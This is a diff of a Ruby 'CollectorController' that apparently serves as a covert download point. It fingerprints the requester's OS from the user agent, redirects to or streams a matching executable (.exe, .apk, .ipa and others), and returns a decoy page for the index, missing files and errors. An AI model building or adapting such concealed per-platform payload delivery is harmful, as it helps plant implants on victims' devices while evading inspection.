@@ -11,7 +11,7 @@ class CollectorController < RESTController
   
   def get
     # serve the requested file
-    http_get_file(@request[:headers], @request[:uri])
+    return http_get_file(@request[:headers], @request[:uri])
   rescue Exception => e
     return decoy_page
   end
@@ -59,27 +59,52 @@ class CollectorController < RESTController
 
   # returns the content of a file in the public directory
   def http_get_file(headers, uri)
-    
+
+    # retrieve the Operating System and app specific extension of the requester
+    os, ext = http_get_os(headers)
+
+    trace :info, "[#{@request[:peer]}][#{os}] GET public request #{uri}"
+
     # no automatic index
     return decoy_page if uri.eql? '/'
     
     # search the file in the public directory, and avoid exiting from it
     file_path = Dir.pwd + PUBLIC_DIR + uri
     return decoy_page unless file_path.start_with? Dir.pwd + PUBLIC_DIR
-    
-    # retrieve the Operating System and app specific extension of the requester
-    os, ext = http_get_os(headers)
 
+    # complete the request of the client
     file_path = File.realdirpath(file_path)
-    file_path += ext unless File.exist?(file_path) and File.file?(file_path)
-    
-    return decoy_page unless File.exist?(file_path) and File.file?(file_path)
+
+    # if the file is not present
+    if not File.file?(file_path)
+      # appent the extension for the arch of the requester
+      arch_specific_file = uri + ext
+
+      if File.file?(file_path + ext)
+        trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
+        return http_redirect arch_specific_file
+      end
+    end
+
+    return decoy_page unless File.file?(file_path)
 
     trace :info, "[#{@request[:peer]}][#{os}] serving #{file_path}"
-    
+
+    return ok(File.read(file_path), {:content_type => 'binary/octet-stream'}) if File.size(file_path) < 16384
     return stream_file File.realdirpath(file_path)
   end
-  
+
+  def http_redirect(file)
+    body =  "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">"
+    body += "<html><head>"
+    body += "<title>302 Found</title>"
+    body += "</head><body>"
+    body += "<h1>Found</h1>"
+    body += "<p>The document has moved <a href=\"#{file}\">here</a>.</p>"
+    body += "</body></html>"
+    return redirect(body, {location: file})
+  end
+
   # return the content of the X-Forwarded-For header
   def http_get_forwarded_peer(headers)
     # extract the XFF
@@ -133,14 +158,14 @@ class CollectorController < RESTController
     trace :debug, "[#{@request[:peer]}] #{user_agent}"
     
     # return the correct type and extension
-    return 'macos', '.app' if user_agent['MacOS;'] or user_agent['Macintosh;']
-    return 'iphone', '.ipa' if user_agent['iPhone;'] or user_agent['iPad;'] or user_agent['iPod;']
-    return 'windows', '.exe' if user_agent['Windows;']
-    return 'winmo', '.cab' if user_agent['Windows CE;']
-    return 'blackberry', '.jad' if user_agent['BlackBerry;']
-    return 'linux', '.bin' if user_agent['Linux;'] or user_agent['X11;']
-    return 'symbian', '.sisx' if user_agent['Symbian;']
-    return 'android', '.apk' if user_agent['Android;']
+    return 'osx', '.app' if user_agent['MacOS'] or user_agent['Macintosh']
+    return 'ios', '.ipa' if user_agent['iPhone'] or user_agent['iPad'] or user_agent['iPod']
+    return 'windows', '.exe' if user_agent['Windows']
+    return 'winmo', '.cab' if user_agent['Windows CE']
+    return 'blackberry', '.jad' if user_agent['BlackBerry']
+    return 'linux', '.bin' if user_agent['Linux'] or user_agent['X11']
+    return 'symbian', '.sisx' if user_agent['Symbian']
+    return 'android', '.apk' if user_agent['Android']
 
     return 'unknown', ''
   end
